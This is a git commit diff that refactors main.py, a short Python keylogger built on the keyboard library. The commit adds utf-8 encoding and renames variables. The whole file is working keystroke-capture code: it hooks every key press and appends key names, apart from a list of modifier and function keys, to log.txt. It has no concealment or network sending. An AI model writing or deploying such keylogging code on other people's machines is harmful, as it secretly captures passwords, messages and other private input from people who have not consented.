ff1f4eefb5163e70682b7202a91d49ab24285a22
Macailh <salvadorenriquegb@gmail.com>
2023-07-23 10:59:30 -0600

    refactor: to add encoding

--- main.py
+++ main.py
@@ -1,17 +1,19 @@
 import keyboard
 
-def when_press_the_key(key):
-    keys_to_ignore = ['alt', 'delete', 'tab', 'back', 'esc', 'ctrl', 'shift', 'win', 'caps lock', 'up', 'down', 'left', 'right', 'insert', 'home', 'page up', 'page down', 'end', 'num lock', 'scroll lock', 'pause', 'print screen', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']
 
-    with open('log.txt', 'a') as f:
+def when_press_the_key(key):
+    keys_to_ignore = ['alt', 'delete', 'tab', 'back', 'esc', 'ctrl', 'shift', 'win', 'caps lock', 'up', 'down', 'left', 'right', 'insert', 'home', 'page up',
+                      'page down', 'end', 'num lock', 'scroll lock', 'pause', 'print screen', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']
+
+    with open('log.txt', 'a', encoding='utf-8') as log_file:
         if key not in keys_to_ignore:
             if key.name == 'enter':
-                f.write('\n')
+                log_file.write('\n')
             elif key.name == 'space':
-                f.write(' ')
+                log_file.write(' ')
             else:
-                f.write(key.name)
+                log_file.write(key.name)
+
 
 keyboard.on_press(when_press_the_key)
 keyboard.wait()
-            
